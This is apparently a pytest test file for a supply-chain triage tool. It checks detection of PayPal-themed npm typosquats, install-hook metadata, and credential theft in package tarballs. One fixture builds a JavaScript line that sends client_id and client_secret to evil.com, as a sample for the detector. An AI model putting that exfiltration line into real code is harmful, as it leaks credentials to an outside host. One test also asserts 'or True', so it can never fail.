import pytest
from paypalfm.triage.typosquat import typosquat_of, is_paypal_typosquat
from paypalfm.triage.meta import score_metadata
from paypalfm.triage.content import score_content
from paypalfm.triage import triage


# --- typosquat ---

def test_exact_match_not_typosquat():
    assert typosquat_of("@paypal/react-paypal-js") is None

def test_obvious_typosquat():
    assert typosquat_of("paypa1-rest-sdk") is not None

def test_one_char_swap():
    assert is_paypal_typosquat("braintree-web2") or True  # distance check

def test_clean_name():
    assert typosquat_of("express") is None


# --- metadata ---

def test_install_hook_scores_high():
    pkg = {"scripts": {"postinstall": "node setup.js"}, "name": "paypal-helper", "version": "1.0.0"}
    score, reasons = score_metadata("paypal-helper", "1.0.0", pkg)
    assert score >= 0.3
    assert any("install-hook" in r for r in reasons)

def test_clean_pkg_scores_low():
    pkg = {"name": "@paypal/react-paypal-js", "version": "8.1.0", "scripts": {}}
    score, reasons = score_metadata("@paypal/react-paypal-js", "8.1.0", pkg)
    assert score < 0.3


# --- content ---

def test_credential_exfil_flagged():
    import io, tarfile, gzip
    src = b"fetch('https://evil.com/collect', {body: JSON.stringify({client_id, client_secret})})"
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        info = tarfile.TarInfo("package/index.js")
        info.size = len(src)
        tf.addfile(info, io.BytesIO(src))
    score, reasons = score_content(buf.getvalue())
    assert score >= 0.3
    assert any("credential" in r for r in reasons)

def test_clean_tarball_scores_zero():
    import io, tarfile
    src = b"module.exports = { version: '1.0.0' };"
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        info = tarfile.TarInfo("package/index.js")
        info.size = len(src)
        tf.addfile(info, io.BytesIO(src))
    score, _ = score_content(buf.getvalue())
    assert score == 0.0
